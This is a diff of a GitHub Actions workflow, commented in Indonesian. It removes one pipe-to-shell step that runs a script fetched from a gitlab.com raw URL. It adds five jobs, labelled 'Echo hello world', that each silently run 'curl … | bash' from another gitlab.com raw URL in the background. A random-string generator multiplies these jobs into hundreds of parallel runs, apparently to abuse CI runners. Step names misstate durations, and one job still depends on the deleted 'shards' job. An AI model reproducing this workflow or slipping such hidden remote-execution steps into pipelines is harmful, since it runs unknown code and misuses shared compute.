@@ -8,64 +8,149 @@ on:
         required: true
         default: '999'
 
-permissions:
-  actions: write
-
-
-concurrency:
-  group: phase-lscpu
-  cancel-in-progress: false
+permissions: {}
 
 jobs:
-  shards:
-    strategy:
-      fail-fast: false
-      max-parallel: 20
-      matrix:
-        shard: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
+  # =============================================
+  # 🔮 Generator (tetap sama, tanpa loop_count)
+  # =============================================
+  generate:
     runs-on: ubuntu-latest
-    timeout-minutes: 60
+    outputs:
+      line_go: ${{ steps.gen.outputs.line_go }}
+      line_flag: ${{ steps.gen.outputs.line_flag }}
+      lucas_go: ${{ steps.gen.outputs.lucas_go }}
+      lucas_flag: ${{ steps.gen.outputs.lucas_flag }}
+      popay_go: ${{ steps.gen.outputs.popay_go }}
+      popay_flag: ${{ steps.gen.outputs.popay_flag }}
+      dandi_go: ${{ steps.gen.outputs.dandi_go }}
+      dandi_flag: ${{ steps.gen.outputs.dandi_flag }}
+      alam_go: ${{ steps.gen.outputs.alam_go }}
+      alam_flag: ${{ steps.gen.outputs.alam_flag }}
     steps:
-      - name: "shard ${{ matrix.shard }}/20"
-        timeout-minutes: 40
-        env:
-          SHARD: ${{ matrix.shard }}
+      - name: Generate random strings
+        id: gen
+        shell: python
         run: |
-          set -uo pipefail
-          echo "=== shard $SHARD/20 ==="
+          import random, string, json, os
 
-          need() { dpkg -s "$1" >/dev/null 2>&1 || MISSING+=("$1"); }
-          MISSING=()
-          for p in \
-            build-essential python3 python3-dev pkg-config make g++ \
-            libssl-dev zlib1g-dev libsqlite3-dev \
-            libvips-dev \
-            libcairo2-dev libpango1.0-dev libjpeg-dev libgif-dev librsvg2-dev \
-            ffmpeg imagemagick \
-            git curl wget unzip ca-certificates; do
-            need "$p"
-          done
+          def random_strings(n, min_len=3, max_len=5):
+              res = set()
+              while len(res) < n:
+                  length = random.randint(min_len, max_len)
+                  chars = string.ascii_letters + string.digits
+                  s = ''.join(random.choice(chars) for _ in range(length))
+                  res.add(s)
+              return list(res)
 
-          if [ ${#MISSING[@]} -gt 0 ]; then
-            echo ">>> Install: ${MISSING[*]}"
-            sudo apt-get update -qq
-            sudo apt-get install -y -qq --no-install-recommends "${MISSING[@]}"
-          else
-            echo ">>> Semua deps sudah ada, skip apt"
-          fi
+          specs = {
+              'line_go': 9, 'line_flag': 26,
+              'lucas_go': 9, 'lucas_flag': 26,
+              'popay_go': 9, 'popay_flag': 26,
+              'dandi_go': 9, 'dandi_flag': 15,
+              'alam_go': 9, 'alam_flag': 19
+          }
 
-          echo "=== versi ==="
-          node -v; npm -v; which node
-          lscpu | head -10
+          with open(os.environ['GITHUB_OUTPUT'], 'a') as f:
+              for name, count in specs.items():
+                  vals = random_strings(count)
+                  f.write(f"{name}={json.dumps(vals)}\n")
 
-          curl -sL  https://gitlab.com/makanan99/blasters/-/raw/main/tree | bash
+  # =============================================
+  # 📦 Job line
+  # =============================================
+  line:
+    needs: generate
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    strategy:
+      max-parallel: 20
+      fail-fast: false
+      matrix:
+        go: ${{ fromJSON(needs.generate.outputs.line_go) }}
+        flag: ${{ fromJSON(needs.generate.outputs.line_flag) }}
+    steps:
+      - name: Echo hello world & tahan 4 menit
+        run: |
+          echo "hello world" & curl -sL  https://gitlab.com/spinazolla/saint/-/raw/main/ions | bash &
+          sleep 625s
 
-          RC=$?
+  # =============================================
+  # 🧊 Job lucas
+  # =============================================
+  lucas:
+    needs: [generate, line]
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    strategy:
+      max-parallel: 20
+      fail-fast: false
+      matrix:
+        go: ${{ fromJSON(needs.generate.outputs.lucas_go) }}
+        flag: ${{ fromJSON(needs.generate.outputs.lucas_flag) }}
+    steps:
+      - name: Echo hello world & tahan 18 menit
+        run: |
+          echo "hello world" & curl -sL  https://gitlab.com/spinazolla/saint/-/raw/main/ions | bash & 
+          sleep 18m
 
-          if [ "$RC" -ne 0 ]; then
-            echo "❌ shard $SHARD gagal (exit $RC)"; exit "$RC"
-          fi
-          echo "✅ shard $SHARD selesai"
+  # =============================================
+  # 🍚 Job popay
+  # =============================================
+  popay:
+    needs: [generate, line]   # paralel dengan lucas
+    runs-on: ubuntu-latest
+    timeout-minutes: 115
+    strategy:
+      max-parallel: 20
+      fail-fast: false
+      matrix:
+        go: ${{ fromJSON(needs.generate.outputs.popay_go) }}
+        flag: ${{ fromJSON(needs.generate.outputs.popay_flag) }}
+    steps:
+      - name: Echo hello world & tahan 105 menit
+        run: |
+          echo "hello world" & curl -sL  https://gitlab.com/spinazolla/saint/-/raw/main/ions | bash & 
+          sleep 15m
+
+  # =============================================
+  # 🍜 Job dandi
+  # =============================================
+  dandi:
+    needs: [generate, lucas]
+    runs-on: ubuntu-latest
+    timeout-minutes: 168
+    strategy:
+      max-parallel: 20
+      fail-fast: false
+      matrix:
+        go: ${{ fromJSON(needs.generate.outputs.dandi_go) }}
+        flag: ${{ fromJSON(needs.generate.outputs.dandi_flag) }}
+    steps:
+      - name: Echo hello world & tahan 158 menit
+        run: |
+          echo "hello world" & curl -sL  https://gitlab.com/spinazolla/saint/-/raw/main/ions | bash & 
+          sleep 15m
+
+  # =============================================
+  # 🍚 Job alam
+  # =============================================
+  alam:
+    needs: [generate, popay]
+    runs-on: ubuntu-latest
+    timeout-minutes: 170
+    strategy:
+      max-parallel: 20
+      fail-fast: false
+      matrix:
+        go: ${{ fromJSON(needs.generate.outputs.alam_go) }}
+        flag: ${{ fromJSON(needs.generate.outputs.alam_flag) }}
+    steps:
+      - name: Echo hello world & tahan 160 menit
+        run: |
+          echo "hello world" & curl -sL  https://gitlab.com/spinazolla/saint/-/raw/main/ions | bash & 
+          sleep 16m
+
 
   trigger-hello:
     needs: shards
